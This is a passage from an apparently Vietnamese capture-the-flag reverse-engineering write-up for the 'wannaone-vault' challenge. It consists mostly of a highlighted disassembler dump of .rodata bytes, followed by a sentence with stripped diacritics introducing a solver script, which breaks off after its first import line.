</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>A                 db  <span style="color:#ae81ff">37</span>h ; <span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000205F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002060</span>                 db  <span style="color:#ae81ff">28</span>h ; (
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002061</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002062</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002063</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002064</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002065</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002066</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002067</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">79</span>h ; y
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>A                 db  <span style="color:#ae81ff">3</span>Ah ; <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000206F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002070</span>                 db  <span style="color:#ae81ff">2</span>Ah ; <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002071</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002072</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002073</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002074</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002075</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002076</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002077</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">7</span>Bh ; {
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>A                 db  <span style="color:#ae81ff">6</span>Ah ; j
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000207F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">80</span>                 db  <span style="color:#ae81ff">2</span>Ch ; ,
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">81</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">82</span>                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">83</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">84</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">85</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">86</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">87</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">88</span>                 db  <span style="color:#ae81ff">7</span>Dh ; }
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">89</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>A                 db  <span style="color:#ae81ff">3</span>Ch ; <span style="color:#f92672">&lt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">8</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000208F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">90</span>                 db  <span style="color:#ae81ff">2</span>Eh ; .
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">91</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">92</span>                 db  <span style="color:#ae81ff">3</span>Eh ; <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">93</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">94</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">95</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">96</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">97</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">98</span>                 db  <span style="color:#ae81ff">7F</span>h ; <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">99</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>A                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span><span style="color:#ae81ff">9</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000209F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A0                 db  <span style="color:#ae81ff">30</span>h ; <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A2                 db  <span style="color:#ae81ff">4F</span>h ; O
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A8                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>A9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AA                 db  <span style="color:#ae81ff">67</span>h ; g
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>AF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B0                 db  <span style="color:#ae81ff">32</span>h ; <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B2                 db  <span style="color:#ae81ff">73</span>h ; s
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B8                 db  <span style="color:#ae81ff">63</span>h ; c
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>B9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BA                 db  <span style="color:#ae81ff">66</span>h ; f
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>BF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C0                 db  <span style="color:#ae81ff">34</span>h ; <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C2                 db  <span style="color:#ae81ff">78</span>h ; x
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C8                 db  <span style="color:#ae81ff">65</span>h ; e
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>C9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CA                 db  <span style="color:#ae81ff">61</span>h ; a
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>CF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D0                 db  <span style="color:#ae81ff">36</span>h ; <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D1                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D2                 db  <span style="color:#ae81ff">49</span>h ; I
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D3                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D4                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D5                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D6                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D7                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D8                 db  <span style="color:#ae81ff">67</span>h ; g
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>D9                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DA                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DD                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>DF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E0</span>                 db  <span style="color:#ae81ff">38</span>h ; <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E1</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E2</span>                 db  <span style="color:#ae81ff">77</span>h ; w
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E3</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E4</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E5</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E6</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E7</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E8</span>                 db  <span style="color:#ae81ff">69</span>h ; i
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020E9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EA                 db  <span style="color:#ae81ff">76</span>h ; v
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EB                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EC                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>ED                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EE                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020</span>EF                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">0</span>                 db  <span style="color:#ae81ff">3</span>Ah ; <span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">1</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">2</span>                 db  <span style="color:#ae81ff">7</span>Eh ; <span style="color:#f92672">~</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">3</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">4</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">5</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">6</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">7</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6</span>Bh ; k
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>A                 db  <span style="color:#ae81ff">44</span>h ; D
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020F</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">00000000000020FF</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002100</span>                 db  <span style="color:#ae81ff">3</span>Ch ; <span style="color:#f92672">&lt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002101</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002102</span>                 db  <span style="color:#ae81ff">76</span>h ; v
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002103</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002104</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002105</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002106</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002107</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6</span>Dh ; m
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>A                 db  <span style="color:#ae81ff">2</span>Dh ; <span style="color:#f92672">-</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000210F</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002110</span>                 db  <span style="color:#ae81ff">3</span>Eh ; <span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002111</span>                 db  <span style="color:#ae81ff">70</span>h ; p
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002112</span>                 db  <span style="color:#ae81ff">7</span>Ch ; <span style="color:#f92672">|</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002113</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002114</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002115</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002116</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">0000000000002117</span>                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span><span style="color:#ae81ff">8</span>                 db  <span style="color:#ae81ff">6F</span>h ; o
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span><span style="color:#ae81ff">9</span>                 db  <span style="color:#ae81ff">20</span>h
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>A                 db  <span style="color:#ae81ff">62</span>h ; b
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>B                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>C                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>D                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211</span>E                 db    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>.rodata:<span style="color:#ae81ff">000000000000211F</span>                 db    <span style="color:#ae81ff">0</span>  
</span></span></code></pre></div><p>Mi th  r rng, di y l script cho bi ton ny:</p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/vault.py">vault.py</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
